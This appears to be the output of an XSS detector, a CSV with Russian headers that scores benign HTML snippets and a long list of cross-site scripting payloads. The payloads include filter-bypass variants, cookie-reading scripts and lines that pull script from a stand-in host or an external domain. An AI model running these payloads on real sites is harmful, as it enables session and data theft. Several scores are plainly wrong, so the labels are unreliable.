Входная строка;XSS;Вероятность;Риск
"""><link rel=""stylesheet"" href=""style.css""><img src=x onerror=prompt(document.domain);>";True;43.70%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<p>About</p>;False;34.33%;LOW
"javascript:alert(document.domain);";True;96.89%;CRITICAL
â€œ><img only src=1 onerror=alert()>;True;99.47%;CRITICAL
<script>new Function`X${document.location.hash.substr`1`}`</script>;True;66.10%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-";True;90.83%;CRITICAL
"&amp;amp;amp;amp;lt;img/src/onerror=alert(`test`)&amp;amp;amp;amp;gt;";True;99.41%;CRITICAL
"""><svg onmouseover=""confirm&#0000000040document.domain)";True;82.54%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<frameset><frame id=x onfocus=alert(1)>;True;99.86%;CRITICAL
"test<i>test</i><a onmouseover=""alert(document.cookie)"">";True;99.15%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>;True;97.98%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<form action=""javascript:alert(1)""><input type=submit id=x></form><label for=x>XSS</label>";True;86.81%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
"<img src=""java	script:al	ert('Successful XSS')"">";True;90.05%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
javascript:eval(unescape(location.href));True;83.35%;CRITICAL
document['cookie'];True;90.75%;CRITICAL
"';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//"";alert(String.fromCharCode (88,83,83))//"";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>";True;53.94%;MEDIUM
<span class='class-1094'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
"""&amp;lt;img src=1 onerror=alert(1)&amp;gt;";True;99.67%;CRITICAL
"javascript://</title>""/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/";True;99.09%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<form><button formaction=javascript:alert(1)>click;True;91.06%;CRITICAL
"""><img src=x onerror=prompt('document.domain');>";True;80.54%;CRITICAL
"&amp;amp;amp;amp;lt;script&amp;amp;amp;amp;gt;alert(1)&amp;amp;amp;amp;lt;/script&amp;amp;amp;amp;gt;";True;87.19%;CRITICAL
<span class='class-714'>Services</span>;False;1.13%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
<h2>Login</h2>;False;27.98%;LOW
<span class='class-594'>Services</span>;False;1.13%;SAFE
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<span class='class-1154'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
"(function(){alert(document.cookie)})();";True;87.72%;CRITICAL
"x""><svg%0Donload=`window['alert']((document)['cookie'])`>";True;96.44%;CRITICAL
"""><img&#x20;src=x&#x20;onerror=prompt('XSS')>""";True;78.66%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<p>About</p>;False;34.33%;LOW
<span class='class-414'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x14""1";True;99.49%;CRITICAL
%253Cimg%2520src%253Dx%2520onerror%253Dalert%2528%2529%253E;True;76.56%;HIGH
<span class='class-914'>Services</span>;False;1.13%;SAFE
"xss""</sc""ript><sv""g/onloa""d=aler""t""(document.doma""in)>";True;64.62%;HIGH
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p>About</p>;False;34.33%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<iframe srcdoc=""<img src=1 onerror=alert(1)>""></iframe>";True;99.91%;CRITICAL
<img id=x tabindex=1 onfocus=alert(1)></img>;True;99.87%;CRITICAL
"%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0a%3Cscript%3Ealert(1);%3C/script%3E";True;77.32%;HIGH
"""<div style=""background-image: url(x)"" onerror=prompt(document.domain);>";True;96.69%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<h6>Login</h6>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
"""><img src=x onerror=prompt(document['domain']);>.htm";True;80.54%;CRITICAL
"""><svg+onload=alert&amp;#x63""1";True;99.49%;CRITICAL
%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt(%22XSS%22)%3E;True;57.43%;MEDIUM
"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss";True;89.84%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<h6>Login</h6>;False;27.98%;LOW
"""><svg+onload=alert&amp;#x79""1";True;99.49%;CRITICAL
*/alert(1)</script><script>/*;True;86.08%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>";True;99.65%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<h6>Login</h6>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
%0d%0a%0d%0a<script>alert(document.domain)</script>;True;75.55%;HIGH
<input type='text' name='field'>;False;29.42%;LOW
<p>About</p>;False;34.33%;LOW
"""><img src=x style=content:'x' onerror=prompt(document.domain);>";True;82.88%;CRITICAL
"&amp;amp;amp;lt;img/src/onerror=alert(`test`)&amp;amp;amp;gt;";True;99.33%;CRITICAL
<div>Home</div>;False;25.75%;LOW
'-[document.domain].map(alert)-';True;91.47%;CRITICAL
<span class='class-94'>Services</span>;False;1.21%;SAFE
{{_s.constructor('alert(1)')()}};True;89.31%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<span class='class-894'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x53""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"JavaScript://%250A/*?'/*\'/*""/*\""/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is/.source))}//\76-->";True;99.10%;CRITICAL
"1')""<!--><Svg OnLoad=(confirm)(1)<!--";True;93.15%;CRITICAL
â€˜ onfocus=â€™alert(1)â€™ autofocus=â€™;True;99.25%;CRITICAL
<img onfocus=alert(1) autofocus tabindex=1>;True;99.67%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"/</title/'/</style/</script/</textarea/--><p"" onclick=alert()//>*/alert()/*";True;99.59%;CRITICAL
"<svg onload=alert%26%230000000040"""")>";True;99.72%;CRITICAL
</script><script>alert(1)</script>;True;84.83%;CRITICAL
"<details/open=/Open/href=/data=;+ontoggle=""(alert)(document.domain)";True;98.55%;CRITICAL
"""><img src=""x"" onerror=""prompt(document.domain);"">";True;74.84%;HIGH
<data id=x tabindex=1 onfocus=alert(1)></data>;True;99.87%;CRITICAL
"'>ðŸ‘½ðŸ’»ðŸ”¥<script>alert(2);</script>";True;86.88%;CRITICAL
"tarun""><x/onafterscriptexecute=confirm%26lpar;)// -@sratarun";True;80.49%;CRITICAL
"</script><script>alert('XSS');</script>";True;89.55%;CRITICAL
"<iframe/onload=""var b = 'document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b; this['src']=a"">";False;26.77%;LOW
<ul onfocus=alert(1) autofocus tabindex=1>;True;99.68%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x73""1";True;99.49%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x6D""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x6F""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
%2527%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E;True;88.30%;CRITICAL
"""><svg+onload=alert&amp;#x18""1";True;99.49%;CRITICAL
"&lt;svg onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;";True;75.73%;HIGH
<h6>Login</h6>;False;27.98%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<span class='class-1354'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
%3F%20<script>alert(1)</script>;True;85.70%;CRITICAL
"<svg onload=alert (1337)&nvgt;";True;99.77%;CRITICAL
['script'](2);True;82.28%;CRITICAL
"<script>(0)['constructor']['constructor'](""\141\154\145\162\164(1)"")();</script>";True;52.34%;MEDIUM
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>;True;99.86%;CRITICAL
<span class='class-44'>Services</span>;False;1.21%;SAFE
"""><svg+onload=alert&amp;#x49""1";True;99.49%;CRITICAL
<image/src/onerror=prompt(8)>;True;69.82%;HIGH
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<p>About</p>;False;34.33%;LOW
%u003c%u0073%u0063%u0072%u0069%u0070%u0074%u003ealert('XSS')%u003c%u002f%u0073%u0063%u0072%u0069%u0070%u0074%u003e;True;78.18%;HIGH
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==;True;35.72%;LOW
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>";True;98.65%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<p>About</p>;False;34.33%;LOW
><imgsrc=x onerror=confirm.onerror=confirm(1)>;True;71.20%;HIGH
"<a/href=%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x0a;:alert(1)>please%20click%20here</a>";True;49.20%;MEDIUM
"1&""><script>alert(1)</script>=1";True;92.86%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">";True;96.18%;CRITICAL
"%27%09);%0d%0a%09%09[1].find(alert)//";True;84.20%;CRITICAL
<p>About</p>;False;34.33%;LOW
"""><svg+onload=alert&amp;#x39""1";True;99.49%;CRITICAL
<span class='class-1074'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x08""1";True;99.49%;CRITICAL
"""><svg onload=prompt(document.domain);>.html";True;85.76%;CRITICAL
";alert(123);";True;92.56%;CRITICAL
"""><ImG%20sRc=x%20onErroR=prompt`XSS`>";True;72.82%;HIGH
<img src='image.jpg' alt='image'>;False;34.81%;LOW
ignition/scripts/--><svg%20onload=alert%28document.domain%29>;True;98.26%;CRITICAL
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
%uff1cscript%uff1ealert(1234)%uff1c/script%uff1e;True;90.69%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""><svg+onload=alert&amp;#x4C""1";True;99.49%;CRITICAL
"&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;";True;92.60%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x31""1";True;99.49%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<script>alert`1`</script>;True;84.27%;CRITICAL
javascript:{ alert`0` };True;95.57%;CRITICAL
"//"";alert(String.fromCharCode(88,83,83))";True;78.35%;HIGH
<isindex+type=image+src=1+onerror=alert(1)>;True;99.32%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><svg+onload=alert&amp;#x09""1";True;99.49%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><svg+onload=alert&amp;#x44""1";True;99.49%;CRITICAL
"""><script&#x00000003B;alert&#x000000028;1&#x000000029;&#x00000003B;</script>";True;71.84%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"""><script>var img=document.createElement('img');img.src='x';img.onerror=function(){prompt(document.domain);};document.body.appendChild(img);</script>";True;97.63%;CRITICAL
"""><svg+onload=alert&amp;#x13""1";True;99.49%;CRITICAL
<h6>Login</h6>;False;27.98%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"""onpointerover=â€alert(â€˜XSSâ€™)";True;99.39%;CRITICAL
%7b%0a%20%20%22%64%61%74%61%22%3a%20%22%7b%74%65%78%74%3a%3c%69%6d%67%2f%73%72%63%3d%78%20%6f%6e%6c%6f%61%64%3d%63%6f%6e%66%69%72%6d%28%31%29%3e%7d%22%2c%0a%20%20%22%65%76%65%6e%74%49%44%22%3a%20%32%33%34%32%33%0a%7d;True;70.29%;HIGH
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<object><param name=""src"" value=""javascript:alert(0)""></param></object>";True;99.10%;CRITICAL
"<inpuT autofocus oNFocus=""setTimeout(function() { /*\*/top['al'+'\u0065'+'rt'](1)/*\*/ }, 5000);""></inpuT%3E;";True;97.66%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""&amp;gt;&amp;lt;img src=x onerror=prompt(document.domain);&amp;gt;";True;98.61%;CRITICAL
%25253Cscript%25253Ealert('XSS')%25253C%252Fscript%25253E;True;89.59%;CRITICAL
%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(test`)>;True;99.14%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<input type='text' name='field'>;False;29.42%;LOW
"%E5%98%8D%E5%98%8A%20""><img src=q onerror=alert(1)>";True;99.63%;CRITICAL
themecolor=%22-alert('XSS')-%22;True;88.28%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<img src/onerror=alert(1)>;True;99.78%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
svg/onload=alert(document.cookie)abcdef@test.com;True;98.95%;CRITICAL
<span class='class-334'>Services</span>;False;1.13%;SAFE
"""+onfocus=""prompt(1)""+";True;81.03%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<p>About</p>;False;34.33%;LOW
"1'""><img/src/onerror=.1|alert``>";True;99.38%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
'><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--;True;86.73%;CRITICAL
<span class='class-84'>Services</span>;False;1.21%;SAFE
"""><svg><img src=x onerror=prompt(document.domain);></svg>";True;89.84%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<h4>Login</h4>;False;27.98%;LOW
"""><img src=x onerror=prompt(document.domain);>";True;78.78%;HIGH
"""><input value=<><iframe/src=javascript:confirm(1)";True;94.85%;CRITICAL
%EF%BC%9Cscript%EF%BC%9Ealert()%EF%BC%9C/script%EF%BC%9E;True;88.55%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<a href='/page'>Contact</a>;False;1.05%;SAFE
<math><brute xlink:href=javascript:alert(1)>click;True;92.64%;CRITICAL
<img/src=q onerror='new Function`al\ert\`1\``'>;True;98.90%;CRITICAL
%3Cscript%3Ealert(1)%3C/script%00TESTTEST%3E;True;91.00%;CRITICAL
"eval('alert(1)');";True;94.03%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B;True;88.30%;CRITICAL
<h2>Login</h2>;False;27.98%;LOW
javascript:alert(1);True;95.92%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"%0d%0a%20<body onload=alert(""bingo"")>";True;99.38%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
"asd""`> onpointerenter=x=prompt,x`XSS`";True;71.12%;HIGH
"""`'><script>\x09javascript:alert(1)</script>";True;91.54%;CRITICAL
"""><svg+onload=alert&amp;#x2B""1";True;99.49%;CRITICAL
<x/oncopy=alert()>x;True;99.26%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<p>About</p>;False;34.33%;LOW
<div>Home</div>;False;25.75%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<div>Home</div>;False;25.75%;LOW
<ol onfocus=alert(1) autofocus tabindex=1>;True;99.68%;CRITICAL
<div>Home</div>;False;25.75%;LOW
PHNjcmlwdD5pbWcgc3JjPXggb25lcnJvci5wcm9tb3RlKHRy;True;35.10%;LOW
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>";True;98.72%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<h2>Login</h2>;False;27.98%;LOW
"<BR SIZE=""&{alert('XSS')}"">";True;80.96%;CRITICAL
"""<IMG DYNSRC=\""javascript:alert('XSS');\"">""";True;93.71%;CRITICAL
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">";True;99.29%;CRITICAL
<script>import('data:text/javascript,alert(1)')</script>;True;88.03%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<p>About</p>;False;34.33%;LOW
<span class='class-294'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"d=""alert('XSS');\"")"";";True;94.90%;CRITICAL
<div>Home</div>;False;25.75%;LOW
<svg onload=eval(URL)>;True;84.71%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
"<IMG SRC="" &#14; javascript:alert('XSS');"">";True;98.67%;CRITICAL
<p>About</p>;False;34.33%;LOW
<a href='/page'>Contact</a>;False;1.05%;SAFE
<span class='class-1034'>Services</span>;False;1.13%;SAFE
<button>Read more</button>;False;28.28%;LOW
"""><svg+onload=alert&amp;#x56""1";True;99.49%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<<SCRIPT>alert(1);//<</SCRIPT>";True;94.73%;CRITICAL
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
<span class='class-654'>Services</span>;False;1.13%;SAFE
"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>";True;68.47%;HIGH
"<style><img title=""</style><img src onerror=alert(1)>""></style>";True;99.72%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<sCriPt>confirm(documen.cookie)</ScRipt>;True;68.08%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
"""><a>a</a><img src=x onerror=alert(document.cookie)>{{9-9}}';alert(0);://";True;98.49%;CRITICAL
<p>About</p>;False;34.33%;LOW
"<IMG SRC=""`<javascript:alert>`('XSS')""";True;99.31%;CRITICAL
"x'><svg%0Donload='window[""alert""](document.cookie)'>";True;96.54%;CRITICAL
"""><img src=x onmouseover=prompt(\u0064ocument.domain);>";True;85.09%;CRITICAL
"""><svg+onload=alert&amp;#x47""1";True;99.49%;CRITICAL
"<?php echo('<SCR'); echo('IPT>alert(""XSS"")</SCRIPT>'); ?>";True;94.61%;CRITICAL
"<iframe src=""javascript:alert(document.domain)""></iframe>";True;90.84%;CRITICAL
"""><img src=1 onmouseleave=print()>";True;82.02%;CRITICAL
<!--><svg onload=alert(1)-->.asp;True;99.63%;CRITICAL
<svg><circle><set onbegin=prompt(1) attributename=fill>;True;90.26%;CRITICAL
<img/anyjunk/onerror=alert(1) src=a>;True;99.46%;CRITICAL
"""><img/src=x/onerro=6><img/src=""1""/onerror=alert(1);>";True;99.50%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<input type='text' name='field'>;False;29.42%;LOW
<script>Function`X${document.location.hash.substr`1`}```</script>;True;65.23%;HIGH
<span class='class-444'>Services</span>;False;1.13%;SAFE
"""><svg+onload=alert&amp;#x03""1";True;99.49%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
%3Cscript%3Ealert(1)%3C/script%3E;True;92.34%;CRITICAL
javascript://%250Aalert(1);True;95.55%;CRITICAL
<a href='/page'>Contact</a>;False;1.05%;SAFE
<input type='text' name='field'>;False;29.42%;LOW
search?q=<img/src/onerror=alert(`test`)>;True;99.22%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">";True;85.86%;CRITICAL
%3Csvg%2Fonload%3D'alert%26%2340%2023%20%26%2341'%3E;True;82.28%;CRITICAL
"<Img src = x onerror = ""javascript: window.onerror = alert; throw XSS"">";True;99.32%;CRITICAL
<p>About</p>;False;34.33%;LOW
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"<img/src=x/onerro=6><img/src=""1""/onerror=alert(1);>?test=test";True;97.79%;CRITICAL
""">'><details/open/ontoggle=confirm('XSS')>";True;71.11%;HIGH
"&amp;lt;img src=1 onerror=alert(1)&amp;gt;";True;99.67%;CRITICAL
%20<img src=1 onerror=alert(1)>;True;99.78%;CRITICAL
<SCRIPT>a=/XSS/%0Aalert(a.source)</SCRIPT;True;82.58%;CRITICAL
'onload=alert(1)><svg/1=';True;99.56%;CRITICAL
"javascript://'/</title></style></textarea></script>--><p"" %0A onclick=alert()//>*/alert()/*";True;99.29%;CRITICAL
"""><svg+onload=alert&amp;#x4E""1";True;99.49%;CRITICAL
<svg onfocus=alert(1) autofocus tabindex=1>;True;99.67%;CRITICAL
<[%00]img onerror=alert(1) src=a>;True;99.70%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<span class='class-824'>Services</span>;False;1.13%;SAFE
<span class='class-1004'>Services</span>;False;1.13%;SAFE
"<scr<script>ipt>document.write(""Successful XSS"")</scr<script>ipt>";True;79.67%;HIGH
"<noembed><img title=""</noembed><img src onerror=alert(1)>""></noembed>";True;99.72%;CRITICAL
"""><img src=x ONERROR=prompt(document.domain);>";True;85.48%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<h2>Login</h2>;False;27.98%;LOW
<span class='class-874'>Services</span>;False;1.13%;SAFE
<div>Home</div>;False;25.75%;LOW
"""><svg+onload=alert&amp;#x01""1";True;99.49%;CRITICAL
"""><img src=""javascript:alert(1);"" />";False;2.60%;SAFE
%20javascript:alert(1);True;95.57%;CRITICAL
onblur=â€alert(â€˜XSSâ€™);True;99.39%;CRITICAL
<h4>Login</h4>;False;27.98%;LOW
<ul><li>Sign up</li></ul>;True;44.09%;MEDIUM
"<meter onmouseover=""alert(1)"" -@manjith27945363";True;99.35%;CRITICAL
<svg><animate onbegin=alert(1) attributeName=x dur=1s>;True;99.86%;CRITICAL
"""><svg+onload=alert&amp;#x12""1";True;99.49%;CRITICAL
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
"'>'><SCript>alert(2);</script>";True;94.70%;CRITICAL
%E5%98%8D%E5%98%8A%20<script>alert(1)</script>;True;76.65%;HIGH
<a href='/page'>Contact</a>;False;1.05%;SAFE
<p>About</p>;False;34.33%;LOW
"%0d%0a%20""><svg onload=alert(1)>";True;99.72%;CRITICAL
"""><img src=x onerror=prompt(document['domain']);>.asp";True;80.54%;CRITICAL
[1].find(confirm);True;47.17%;MEDIUM
<input type='text' name='field'>;False;29.42%;LOW
"<IMG LOWSRC=""javascript:alert('XSS')"">";True;98.63%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
redirect?url=javascript://%250Aalert(document.domain);True;94.49%;CRITICAL
<span class='class-354'>Services</span>;False;1.13%;SAFE
<img src='image.jpg' alt='image'>;False;34.81%;LOW
"><img/onerror=""javascript:alert(1%26%23x000000029;"" src=x>";True;98.33%;CRITICAL
<button>Read more</button>;False;28.28%;LOW
<button>Read more</button>;False;28.28%;LOW
"â€&amp;amp;amp;amp;gt;&amp;amp;amp;amp;lt;svg onload=alert&amp;amp;amp;amp;amp;#0000000040""1"")&amp;amp;amp;amp;gt;";True;99.54%;CRITICAL
"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'";True;99.21%;CRITICAL
window['alert']();True;87.42%;CRITICAL
<div>Home</div>;False;25.75%;LOW
"""aaa&#x3C;a href=javas&#x26;#99;ript:alert(1)&#x3E;click""";True;83.05%;CRITICAL
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<img src=x:alert(alt) onerror=eval(src) alt=0>;True;99.76%;CRITICAL
<img src='image.jpg' alt='image'>;False;34.81%;LOW
<svg><script xlink:href=data:,alert(1) />;False;0.61%;SAFE
<img src @error=e=$event.path.pop().alert(1)>;True;75.87%;HIGH
<div>Home</div>;False;25.75%;LOW
<p>About</p>;False;34.33%;LOW
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
<button>Read more</button>;False;28.28%;LOW
"%3F%20<body onload=alert(""bingo"")>";True;99.40%;CRITICAL
<span class='class-1464'>Services</span>;False;1.13%;SAFE
<form action='/submit'><input type='text'></form>;True;52.51%;MEDIUM
">'>""><script>alert();</script>";True;93.27%;CRITICAL
<p>About</p>;False;34.33%;LOW
"<a href=""javascript:x='%27-alert(1)-%27';"">XSS</a>";False;9.22%;SAFE
<svg/onloadâ€‹=alert/*1337*/(1)>;True;56.84%;MEDIUM
</script><body/onload=alert(m3ez)>;True;99.67%;CRITICAL
"""\"">"" + ""<img src=x onerror=prompt('XSS')>"" + ""\""""";True;77.08%;HIGH
<img/src/onerror=setTimeout(atob(/YWxlcnQoMTMzNyk/.source))>;True;84.08%;CRITICAL
"<a/href=""j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)"" />tap";True;47.88%;MEDIUM
""" autofocus onkeyup=""javascript:alert(123)";True;99.21%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<span class='class-1264'>Services</span>;False;1.13%;SAFE
"<script>var{a:onerror}={a:alert};throw 1</script>";True;80.80%;CRITICAL
<input type='text' name='field'>;False;29.42%;LOW
<h4>Login</h4>;False;27.98%;LOW
<button>Read more</button>;False;28.28%;LOW
